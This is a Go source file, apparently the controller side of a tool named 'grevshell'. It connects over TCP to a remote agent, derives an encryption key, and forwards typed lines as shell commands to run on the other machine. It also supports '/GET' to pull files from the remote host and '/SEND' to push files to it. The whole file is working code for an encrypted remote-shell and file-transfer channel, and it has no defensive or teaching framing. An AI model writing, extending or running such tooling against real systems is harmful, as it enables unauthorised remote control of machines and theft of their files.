package main 

import (
	"log/slog"
	"fmt"
	"bufio"
	"os"
	"path/filepath"
	"strings"
	"net"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Dial("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
	key, err := grevcore.DeriveKey(stream)

	if err != nil {
		slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
		return
	}

	ProcessLoop(stream, key)
}

func ProcessLoop(c net.Conn, key []byte) {
	send := bufio.NewReader(os.Stdin)
	defer c.Close()

	for {
		var packet grevcore.Packet
		fmt.Printf("%s - $ ", c.RemoteAddr())
		line, err := send.ReadString('\n')

		if err != nil {
			slog.Error("An error occured while reading the command.", slog.Any("ERROR", err))
			continue
		}

		fields := strings.Fields(line)

		if len(fields) == 0 {
			continue
		}

		switch fields[0] {
		case "/SEND":
			packet.Header = grevcore.FileReceiveHeader

			filename := fields[1]
			data, err := os.ReadFile(filename)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				break;
			}

			packet.FileName = filename
			packet.Data = data 

		case "/GET":
			packet.Header = grevcore.FileSendHeader
			filename := fields[1]

			packet.FileName = filename

		case "/EXIT":
			return

		case "/CANCEL":
			packet.Data = []byte("\x03")

		default:
			packet.Header = grevcore.ShellExecHeader
			packet.Data = []byte(line)
		}

		grevcore.SendPacket(c, packet, key)
		recv := grevcore.ReceivePacket(c, key)

		if recv.Data == nil {
			return
		}

		switch recv.Header {
		case grevcore.FileReceiveHeader:
			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
				return
			}

		default:
			fmt.Printf("%s\n", recv.Data)
		}

	}
}
